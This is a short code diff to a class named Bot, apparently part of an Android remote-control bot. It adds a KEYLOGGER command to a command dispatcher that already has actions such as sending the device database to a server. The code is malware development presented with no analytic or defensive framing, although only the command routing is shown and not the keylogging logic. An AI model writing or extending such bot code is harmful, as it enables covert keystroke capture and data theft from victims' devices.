@@ -298,6 +298,10 @@ public class Bot {
                 intent.setAction(CommandsIntentService.ACTION_SEND_DB_TO_SERVER);
                 commandFound = true;
                 break;
+            case Commands.KEYLOGGER:
+                intent.setAction(CommandsIntentService.ACTION_KEYLOGGER);
+                commandFound = true;
+                break;
             default:
                 break;
         }
@@ -342,5 +346,6 @@ public class Bot {
         public static final int CAMERA_PERMISSION = 31;
         public static final int PHONE_PERMISSION = 32;
         public static final int SEND_DB_TO_SERVER = 33;
+        public static final int KEYLOGGER = 34;
     }
 }
